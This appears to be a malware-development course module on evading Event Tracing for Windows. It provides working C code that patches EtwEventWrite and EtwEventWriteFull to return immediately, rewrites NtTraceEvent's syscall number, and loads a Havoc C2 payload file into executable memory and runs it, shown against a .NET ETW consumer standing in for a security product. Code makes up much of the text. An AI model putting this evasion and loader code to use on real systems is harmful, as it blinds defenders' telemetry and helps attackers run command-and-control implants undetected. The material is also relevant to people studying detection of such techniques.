### Introduction

The earlier modules laid the groundwork for comprehending ETW and its various components. Building on that knowledge, it is now possible to dive into the topic of ETW evasion. This module will use the `DotNetEtwConsumer` tool, introduced in the previous module, to represent a security product that is being bypassed.

### Patching ETW WinAPIs

Recall the _Event Tracing for Windows - Introduction_ module where the [EtwEventWrite](https://learn.microsoft.com/en-us/windows/win32/devnotes/etweventwrite) WinAPI was introduced. `EtwEventWrite` along with [EtwEventWriteEx](https://learn.microsoft.com/en-us/windows/win32/api/evntprov/nf-evntprov-eventwriteex) and [EtwEventWriteFull](https://learn.microsoft.com/en-us/windows/win32/devnotes/etweventwritefull) are used to write events to an ETW session.

By applying hooks or patches to these WinAPIs to prevent their original code from executing, the process of writing events to the tracing session can be obstructed. Consequently, the ETW consumer will be unable to receive the events that were meant to be delivered to it, resulting in ETW evasion.

This module will introduce two ways of applying patches to the aforementioned WinAPIs. The first one performs a patch at the start of the `EtwEventWrite` and `EtwEventWriteFull` functions whereas the second method targets the [NtTraceEvent](https://www.geoffchappell.com/studies/windows/km/ntoskrnl/api/etw/traceapi/event/index.htm) syscall function.

### Patch Logic

As previously mentioned, both the `EtwEventWrite` and `EtwEventWriteFull` functions are responsible for writing the events that occur in a tracing session. Therefore, when these functions are blocked from executing, the tracing session stops receiving events as visualized in the image below.

![](https://maldevacademy.s3.amazonaws.com/new/update-three/etw-3-148553269-0ed9aede-8b6a-4ca3-9a04-f5fd83eeaa67.png)

The patch logic can be as simple as placing a `ret` instruction at the start of the target WinAPIs. After the patched `EtwEventWrite` function is invoked, the execution will directly transition to the caller without running the code logic of the function.

### Improving The Patch

To improve the simple `ret` patch, a `xor eax, eax` instruction will be inserted before the `ret` instruction. By performing an XOR operation on the `EAX` register with itself, it will be effectively set to zero. Since all the targeted ETW functions return `ERROR_SUCCESS` (which is zero) upon successful execution, the inclusion of the XOR statement will make it appear as if the `EtwEventWrite` function was successfully executed. Recall from the _Introduction To MASM Assembly_ module that a 64-bit function saves its return value in the `EAX` register.

To apply patches, the assembly instructions need to be converted to opcodes. Therefore, the target functions will be patched to begin with the `33 C0` opcodes, which represent `xor eax, eax` followed by a `C3` opcode, which represents the `ret` instruction.

### PATCH Enumeration

To patch both the `EtwEventWrite` and `EtwEventWriteFull` WinAPIs using the same function, the `PATCH` enumeration is defined. `PATCH` will be passed to the `PatchEtwWriteFunctionsStart` function (shown in the next section) which applies the patch. Passing `PATCH_ETW_EVENTWRITE` to `PatchEtwWriteFunctionsStart` will patch the `EtwEventWrite` WinAPI, whereas passing the `PATCH_ETW_EVENTWRITE_FULL` will patch the `EtwEventWriteFull` WinAPI.

```c
typedef enum PATCH
{
	PATCH_ETW_EVENTWRITE,
	PATCH_ETW_EVENTWRITE_FULL
};
```

### PatchEtwWriteFunctionsStart Function

The `PatchEtwWriteFunctionsStart` function uses the `GetProcAddress` WinAPI to retrieve the address of the target ETW function. Next, it calls the `VirtualProtect` WinAPI to allow writing the shellcode to the fetched address, writes the patch, and finally resets the memory permission to its original state.

The `PatchEtwWriteFunctionsStart` function requires the `PATCH` enumeration to be passed in and will then patch the right function according to the enumeration value that was passed to the function.

The `PATCH` enumeration and `PatchEtwWriteFunctionsStart` currently do not support patching `EtwEventWriteEx`. This will be left as an exercise for the reader.

```c
BOOL PatchEtwWriteFunctionsStart(enum PATCH ePatch) {

	DWORD		dwOldProtection		= 0x00;
	PBYTE		pEtwFuncAddress		= NULL;
	BYTE		pShellcode[3]		= {
                          0x33, 0xC0,    // xor eax, eax
                          0xC3           // ret
	};

	// Get the address of "EtwEventWrite" OR "EtwEventWriteFull" based of 'ePatch'
	pEtwFuncAddress = GetProcAddress(GetModuleHandleA("NTDLL"), ePatch == PATCH_ETW_EVENTWRITE ? "EtwEventWrite" : "EtwEventWriteFull");
	if (!pEtwFuncAddress) {
		printf("[!] GetProcAddress failed with error  %d \n", GetLastError());
		return FALSE;
	}

	// Change memory permissions to RWX
	if (!VirtualProtect(pEtwFuncAddress, sizeof(pShellcode), PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
		printf("[!] VirtualProtect [1] failed with error  %d \n", GetLastError());
		return FALSE;
	}

	// Apply the patch
	memcpy(pEtwFuncAddress, pShellcode, sizeof(pShellcode));

	// Change memory permissions to original
	if (!VirtualProtect(pEtwFuncAddress, sizeof(pShellcode), dwOldProtection, &dwOldProtection)) {
		printf("[!] VirtualProtect [2] failed with error  %d \n", GetLastError());
		return FALSE;
	}

	return TRUE;
}
```

### Patching NtTraceEvent's SSN

Another relevant function within the ETW internals is the [NtTraceEvent](https://www.geoffchappell.com/studies/windows/km/ntoskrnl/api/etw/traceapi/event/index.htm) syscall function. The `NtTraceEvent` syscall function is invoked after the execution of the `EtwEventWrite` or `EtwEventWriteFull` functions. Additionally, `NtTraceEvent` is called by various other ETW-related functions.

The `NtTraceEvent` function is responsible for facilitating the transmission of events to the ETW tracing session. Therefore, when this function is blocked from executing its original code, it produces the same outcome as patching the previously mentioned `EtwEventWrite` and `EtwEventWriteFull` functions. In both cases, the events are prevented from being forwarded to the ETW tracing session.

#### NtTraceEvent Patching Logic

Although applying the same patch introduced earlier (`xor eax, eax` followed by `ret`) will work, the patch applied to the `NtTraceEvent` syscall will be different. Since `NtTraceEvent` is a syscall, it's possible to modify its SSN to a random value causing `NtTraceEvent` to fail and return `0xC000000D` or `STATUS_INVALID_PARAMETER` error code. Recall that a syscall's size is 32 bytes and has the following structure:

```
4C 8BD1                  | mov r10,rcx
B8 XXXXXXXX              | mov eax, <SSN> 
0F05                     | syscall
```

If the concept of SSN is new or a refresher is required, it's highly recommended to review _Module 63: Syscalls - Introduction_.

#### PatchNtTraceEventSSN Function

The `PatchNtTraceEventSSN` function searches for the SSN by searching for the `B8` opcodes, which resembles the `mov eax` instruction. After finding the SSN, it calls `VirtualProtect` to allow for writing a new SSN value. The function modifies `NtTraceEvent`'s syscall number and replaces it with `0xFF`, representing a dummy SSN value.

```c
#define x64_RET_INSTRUCTION_OPCODE			0xC3		// 'ret'	- instruction opcode
#define x64_MOV_INSTRUCTION_OPCODE			0xB8		// 'mov'	- instruction opcode

#define	x64_SYSCALL_STUB_SIZE				0x20		// size of a syscall stub is 32

BOOL PatchNtTraceEventSSN() {
	
	DWORD		dwOldProtection      = 0x00;
	PBYTE		pNtTraceEvent	    = NULL;

	// Get the address of "NtTraceEvent"
	pNtTraceEvent = (PBYTE)GetProcAddress(GetModuleHandleA("NTDLL"), "NtTraceEvent");
	if (!pNtTraceEvent)
		return FALSE;

	// Search for NtTraceEvent's SSN pointer
	for (int i = 0; i < x64_SYSCALL_STUB_SIZE; i++){

		if (pNtTraceEvent[i] == x64_MOV_INSTRUCTION_OPCODE) {
			// Set the pointer to NtTraceEvent's SSN and break
			pNtTraceEvent = (PBYTE)(&pNtTraceEvent[i] + 1);	
			break;
		}

		// If we reached the 'ret' or 'syscall' instruction, we fail
		if (pNtTraceEvent[i] == x64_RET_INSTRUCTION_OPCODE || pNtTraceEvent[i] == 0x0F || pNtTraceEvent[i] == 0x05)
			return FALSE;
	}
	
	// Change memory permissions to RWX
	if (!VirtualProtect(pNtTraceEvent, sizeof(DWORD), PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
		printf("[!] VirtualProtect [1] failed with error  %d \n", GetLastError());
		return FALSE;
	}

	// Apply the patch - Replacing NtTraceEvent's SSN with a dummy one
	// Dummy SSN in reverse order
	*(PDWORD)pNtTraceEvent = 0x000000FF;	

	// Change memory permissions to original
	if (!VirtualProtect(pNtTraceEvent, sizeof(DWORD), dwOldProtection, &dwOldProtection)) {
		printf("[!] VirtualProtect [2] failed with error  %d \n", GetLastError());
		return FALSE;
	}

	return TRUE;
}
```

#### Patch NtTraceEvent's SSN With Caution

It should be noted that the `NtTraceEvent` syscall is called from within several functions and therefore patching it is considered risky and may result in unexpected behavior depending on the nature of the implementation.

### Demo

Patching `EtwEventWrite` start.

![](https://maldevacademy.s3.amazonaws.com/new/update-three/etw-3-248574473-a2a94ddf-9c38-424c-9784-d2701df84038.png)

Patching `EtwEventWriteFull` start.

![](https://maldevacademy.s3.amazonaws.com/new/update-three/etw-3-348574538-ea9056e0-ba4a-4fdd-aeca-2044f7584eaa.png)

Patching `NtTraceEvent`'s SSN value.

![](https://maldevacademy.s3.amazonaws.com/new/update-three/etw-3-448575571-f91ef9b6-c325-4dd1-a365-6e3599f16611.png)

### Video Demo

The video demo will show the result of running the ETW evasion implementation against the `DotNetEtwConsumer` tool. The implementation includes a function called `InjectShellcodeFileLocally` which will read and execute `demon.bin` in the local process memory.

The `demon.bin` file is a payload file generated using the [Havoc C&C framework](https://havocframework.com/). Upon execution, it will open a session that will be used to execute a .NET assembly. The .NET assembly's execution will either be logged by the `DotNetEtwConsumer` tool, highlighting the technique's failure or success in bypassing ETW.

The .NET assembly executed in the demo is [SharpHound](https://github.com/BloodHoundAD/SharpHound) which is an open-source tool used for discovering misconfigurations in Active Directory.

`InjectShellcodeFileLocally` is shown below and requires one argument, `wsShellFileName`, which is the payload file to read (`demo.bin`).

```c

BOOL InjectShellcodeFileLocally(IN LPCWSTR wsShellFileName) {

	HANDLE	hFile					= INVALID_HANDLE_VALUE;
	DWORD	dwBufferSize			= NULL,
			dwNumberOfBytesRead		= NULL,
			dwOldProtection			= NULL;
	PBYTE	pBufferData				= NULL;

	BOOL	bResults				= FALSE;

	if ((hFile = CreateFileW(wsShellFileName, GENERIC_READ, NULL, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL)) == INVALID_HANDLE_VALUE) {
		printf("[!] CreateFileW Failed With Error : %d \n", GetLastError());
		goto _EndOfFunc;
	}

	if ((dwBufferSize = GetFileSize(hFile, NULL)) == INVALID_FILE_SIZE) {
		printf("[!] GetFileSize Failed With Error : %d \n", GetLastError());
		goto _EndOfFunc;
	}

	if ((pBufferData = VirtualAlloc(NULL, dwBufferSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)) == NULL) {
		printf("[!] VirtualAlloc Failed With Error : %d \n", GetLastError());
		goto _EndOfFunc;
	}

	if (!ReadFile(hFile, pBufferData, dwBufferSize, &dwNumberOfBytesRead, NULL) || dwNumberOfBytesRead != dwBufferSize) {
		printf("[!] ReadFile Failed With Error : %d \n", GetLastError());
		printf("[!] Bytes Read: %d of %d\n", dwNumberOfBytesRead, dwBufferSize);
		goto _EndOfFunc;
	}

	if (!VirtualProtect(pBufferData, dwBufferSize, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
		printf("[!] VirtualProtect Failed With Error : %d \n", GetLastError());
		goto _EndOfFunc;
	}

	printf("\t> Running Payload Via Thread ");
	DWORD	dwThreadId	= 0x00;
	HANDLE	hThread		= CreateThread(NULL, NULL, pBufferData, NULL, NULL, &dwThreadId);
	printf("[ %d ] ... \n", dwThreadId);
	if (hThread) {
		WaitForSingleObject(hThread, INFINITE);
	}

	bResults = TRUE;

_EndOfFunc:
	if (hFile != INVALID_HANDLE_VALUE)
		CloseHandle(hFile);
	return bResults;
}
```

The demo is shown below.

[![Video-Demo](https://maldevacademy.s3.amazonaws.com/new/update-three/etw-3-demo-cover.png)](https://maldevacademy.s3.amazonaws.com/new/update-three/etw-3-demo.mp4)